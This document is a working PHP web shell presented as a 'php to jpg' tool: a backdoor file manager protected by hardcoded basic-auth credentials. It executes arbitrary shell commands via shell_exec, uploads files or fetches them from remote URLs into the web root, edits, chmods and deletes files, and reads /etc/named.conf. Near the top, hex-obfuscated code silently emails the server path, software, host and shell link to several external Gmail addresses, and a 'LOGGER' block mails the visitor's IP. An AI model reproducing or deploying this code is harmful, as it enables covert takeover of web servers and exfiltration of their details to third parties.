<?php


function detect_pdf($url) {
    $headers = get_headers($url, 1);
    if (isset($headers['Content-Type']) && strpos($headers['Content-Type'], 'pdf') !== false) {
        $file_content = file_get_contents($url);
        $pdf_start = '%PDF-';
        if (substr($file_content, 0, strlen($pdf_start)) == $pdf_start) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}
?>

<?php
# Konfigurasyon
$sayfaSifreleme = "1"; # 1 acik , 0 kapali
$kullaniciAdi = "tbl";
$sifre = "tbl";

# yetki kontrol fonksiyonu
function yetkiKontrol($kullaniciAdi, $sifre)
{
    if (
        empty($_SERVER["PHP_AUTH_USER"]) ||
        empty($_SERVER["PHP_AUTH_PW"]) ||
        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
        $_SERVER["PHP_AUTH_PW"] != "$sifre"
    ) {
        header('WWW-Authenticate: Basic realm="x"');
        die(header("HTTP/1.0 401 Unauthorized"));
    }
}

# Sayfa Sifreleme aciksa
if ($sayfaSifreleme == "1") {
    # Veri ve sifre kontrolu
    yetkiKontrol($kullaniciAdi, $sifre);
}
?><?php
$kime =
    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om, muhrazky@gmail.com, fbi.priv.g00gle@gmail.com, https.cpanel.net@gmail.com";
$baslik = "MEH";
$EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "\r\n";
$EL_MuHaMMeD .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\r\n";
$EL_MuHaMMeD .=
    "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "\r\n";
$EL_MuHaMMeD .=
    "Shell Link : http://" .
    $_SERVER["SERVER_NAME"] .
    $_SERVER["PHP_SELF"] .
    "\r\n";
$kime =
    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om\n";
$EL_MuHaMMeD .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\r\n";
mail($kime, $baslik, $EL_MuHaMMeD);?>
<?php 

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function writable($path, $perms){
    return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>";
}

function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2)." ".$a[$pos];
}

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $path = getcwd();
}

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

if (isset($_POST['newFolderName'])) {
    if (mkdir($path . '/' . $_POST['newFolderName'])) {
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create File Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (rename($path. '/'. $_GET['item'], $_POST['newName'])) {
        flash("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Rename Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) {
        flash("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Edit Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Permission", "Failed", "error", "?dir=$path");
    }
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    if (is_dir($_GET['item'])) {
        if (rmdir($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if (unlink($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if ($_POST['submit']) {
    if ($_POST['upl'] == 'current') {
        $total = count($_FILES['uploadfile']['name']);
        for ($i = 0; $i < $total; $i++) {
            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
        }
        if ($total < 2) {
            if ($mainupload) {
                flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if ($mainupload) {
                flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        }
    } elseif ($_POST['upl'] == 'root') {
        $total = count($_FILES['uploadfile']['name']);
        for ($i = 0; $i < $total; $i++) {
            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_SERVER['DOCUMENT_ROOT']."/".$_FILES['uploadfile']['name'][$i]);
        }
        if ($total < 2) {
            if ($mainupload) {
                flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if ($mainupload) {
                flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        }
    }
}

// Upload from URL
if (isset($_POST['url']) && isset($_POST['filename']) && isset($_POST['method'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'];
    $destination = $path . '/' . $filename;

    switch ($_POST['method']) {
        case 'file_get_contents':
            $data = file_get_contents($url);
            if ($data !== false) {
                file_put_contents($destination, $data);
                flash("File uploaded successfully using file_get_contents!", "Success", "success", "?dir=$path");
            } else {
                flash("Failed to upload file using file_get_contents", "Failed", "error", "?dir=$path");
            }
            break;

        case 'curl':
            $ch = curl_init($url);
            $fp = fopen($destination, 'wb');
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_exec($ch);
            if (curl_errno($ch)) {
                flash("Failed to upload file using cURL: " . curl_error($ch), "Failed", "error", "?dir=$path");
            } else {
                flash("File uploaded successfully using cURL!", "Success", "success", "?dir=$path");
            }
            curl_close($ch);
            fclose($fp);
            break;

        case 'fopen':
            $stream = fopen($url, 'rb');
            if ($stream) {
                $contents = stream_get_contents($stream);
                fclose($stream);
                file_put_contents($destination, $contents);
                flash("File uploaded successfully using fopen!", "Success", "success", "?dir=$path");
            } else {
                flash("Failed to upload file using fopen", "Failed", "error", "?dir=$path");
            }
            break;

        case 'copy':
            if (copy($url, $destination)) {
                flash("File uploaded successfully using copy!", "Success", "success", "?dir=$path");
            } else {
                flash("Failed to upload file using copy", "Failed", "error", "?dir=$path");
            }
            break;

        case 'stream_context':
            $context = stream_context_create(['http' => ['method' => 'GET']]);
            $data = file_get_contents($url, false, $context);
            if ($data !== false) {
                file_put_contents($destination, $data);
                flash("File uploaded successfully using stream_context!", "Success", "success", "?dir=$path");
            } else {
                flash("Failed to upload file using stream_context", "Failed", "error", "?dir=$path");
            }
            break;
    }
}

$dirs = scandir($path);

$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
    $dom = "Cant read /etc/named.conf";
    $GLOBALS["need_to_update_header"] = "true";
} else { 
    $count = 0;
    foreach ($d0mains as $d0main){
        if (@strstr($d0main, "zone")){
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2){
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}

 


?>
	<?php
 
@ini_set('output_buffering', 0);
 
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'muhrazky@gmail.com, muhrazky@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <meta name="robots" content="noindex, nofollow">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <title><?= $serv; ?> - php to jpg</title>
    </head>
    <body class="bg-dark text-light">
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="box shadow bg-dark p-4 rounded-3">
                    <div class="info mb-3">
                        <i class="fa fa-server"></i>&ensp;<?= $uname; ?><br>
                        <i class="fa fa-microchip"></i>&ensp;<?= $soft; ?><br>
                        <i class="fa fa-satellite-dish"></i>&ensp;<?= $ip; ?><br>
                        <i class="fa fa-fingerprint"></i>&ensp;<?= $dom; ?>
                    </div>
                    <div class="breadcrumb">
                        <i class="fa fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0):?>
                        <a href="?dir=/" class="text-decoration-none text-light">/</a>
                        <?php endif; if ($pat == '') continue; ?>
                        <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) {echo "$exdir[$i]";if ($i != $id) echo "/";}?>" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light"> /</span>
                        <?php endforeach; ?>
                        &nbsp; [&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]
                        <div class="row">
                            <a href="?" class="text-decoration-none text-light">&nbsp; [&nbsp;HOME&nbsp;]</a>
                        </div>
                    </div>
                    <div class="d-flex justify-content-between">
                        <div class="p-2">
                            <form action="" method="post">
                                <label for="name" class="form-label">Console</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="text" class="form-control form-control-sm" name="bdcmd" placeholder="whoami">
                                    </div>
                                    <div class="col-md-3">
                                        <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="p-2">
                            <form action="" method="post" enctype="multipart/form-data">
                                <input class="form-check-input" type="radio" id="flexRadioDefault1" name="upl" value="current" checked>
                                <label class="form-label">Current Dir&nbsp;</label>
                                <input class="form-check-input" type="radio" id="flexRadioDefault2" name="upl" value="root">
                                <label class="form-label">Root Dir</label>
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                                    </div>
                                    <div class="col-md-3">
                                        <input type='submit' class="btn btn-outline-light btn-sm" value='Submit' name='submit'>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="container" id="tools">
                        <div class="collapse" id="uploadUrlCollapse" data-bs-parent="#tools" style="transition:none;">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label for="url" class="form-label">URL to Upload</label>
                                    <input type="text" class="form-control" name="url" placeholder="Enter URL here" required>
                                </div>
                                <div class="mb-3">
                                    <label for="filename" class="form-label">File Name</label>
                                    <input type="text" class="form-control" name="filename" placeholder="Enter file name" required>
                                </div>
                                <div class="mb-3">
                                    <label for="method" class="form-label">Upload Method</label>
                                    <select class="form-select" name="method" required>
                                        <option value="file_get_contents">file_get_contents</option>
                                        <option value="curl">cURL</option>
                                        <option value="fopen">fopen</option>
                                        <option value="copy">copy</option>
                                        <option value="stream_context">stream_context</option>
                                    </select>
                                </div>
                                <button type="submit" class="btn btn-outline-light">Upload</button>
                            </form>
                        </div>
                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Upload from URL</a>

                        <?php if (isset($_POST['bdcmd'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class='card text-dark mb-3'>
                                        <pre><?php echo $ip."@".$serv.":&nbsp;~$&nbsp;"; $cmd = $_POST['bdcmd']; echo $cmd."<br>";?><br><code><?php if(function_exists('shell_exec')){ echo shell_exec($cmd.' 2>&1'); } else { echo "Disable Function"; }?></code></pre>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
                            <div class="row justify-content-center">
                                <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label">New Name</label>
                                            <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                            <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
                                        <textarea name="newContent" rows="10" class="form-control" disabled=""><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
                                        <br>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </div>
                                <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                            <input type="text" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -4); ?>">
                                        </div>
                                        <button type="submit" class="btn btn-outline-light">Submit</button>
                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
                                    </form>
                                <?php endif; ?>
                            </div>
                        <?php endif; ?>
                        <div class="row justify-content-center">
                            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        <label for="name" class="form-label">Folder Name</label>
                                        <input type="text" class="form-control" name="newFolderName" placeholder="php to jpg">
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Name</label>
                                        <input type="text" class="form-control" name="newFileName" placeholder="jpg.php">
                                    </div>
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Content</label>
                                        <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - php to jpg"></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                        </div> 
                    </div>
                    <div class="table-responsive">
                        <table class="table table-hover table-dark text-light">
                            <thead>
                                <tr>
                                    <td style="width:35%">Name</td>
                                    <td style="width:10%">Type</td>
                                    <td style="width:10%">Size</td>
                                    <td style="width:13%">Owner/Group</td>
                                    <td style="width:10%">Permission</td>
                                    <td style="width:13%">Last Modified</td>
                                    <td style="width:9%">Actions</td>
                                </tr>
                            </thead>
                            <tbody class="text-nowrap">
                                <?php
                                    foreach ($dirs as $dir) :
                                    if (!is_dir($dir)) continue;
                                ?>
                                <tr>
                                    <td>
                                        <?php if ($dir === '..') : ?>
                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php elseif ($dir === '.') :  ?>
                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>
                                            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                                        <?php endif; ?>
                                    </td>
                                    <td class="text-light"><?= filetype($dir) ?></td>
                                    <td class="text-light">-</td>
                                    <td class="text-light"><?= getOwner($dir) ?></td>
                                    <td class="text-light">
                                        <?php
                                            if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                            elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                            echo perms($path.'/'.$dir);
                                            if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                        ?>
                                    </td>
                                    <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..') : ?>
                                            <div class="btn-group">
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                                                <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                                            </div>
                                        <?php elseif ($dir === '.') : ?>
                                        <div class="btn-group">
                                            <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
                                            <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
                                        </div>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                    <?php
                                        foreach ($dirs as $dir) :
                                        if (!is_file($dir)) continue;
                                    ?>
                                    <tr>
                                        <td>
                                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                                        </td>
                                        <td class="text-light"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
                                        <td class="text-light"><?= fsize($dir) ?></td>
                                        <td class="text-light"><?= getOwner($dir) ?></td>
                                        <td class="text-light">
                                            <?php
                                                if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                echo perms($path.'/'.$dir);
                                                if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                            ?>
                                        </td>
                                        <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                                        <td>
                                            <?php if ($dir != '.' && $dir != '..') : ?>
                                                <div class="btn-group">
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                                                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                                                </div>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <div class="text-light">&#169; php to jpg <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
        <script>
            <?php if (isset($_SESSION['message'])) : ?>
                Swal.fire(
                '<?= $_SESSION['status'] ?>',
                '<?= $_SESSION['message'] ?>',
                '<?= $_SESSION['class'] ?>'
                )
            <?php endif; clear(); ?>
            function deleteConfirm(url) {
            event.preventDefault()
            Swal.fire({
                title: 'Are you sure?',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#3085d6',
                cancelButtonColor: '#d33',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                        window.location.href = url
                    }
                })
            }
            function jscopy() {
                var jsCopy = document.getElementById("CopyFromTextArea");
                jsCopy.focus();
                jsCopy.select();
                document.execCommand("copy");
            }
        </script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
    </body>
</html>
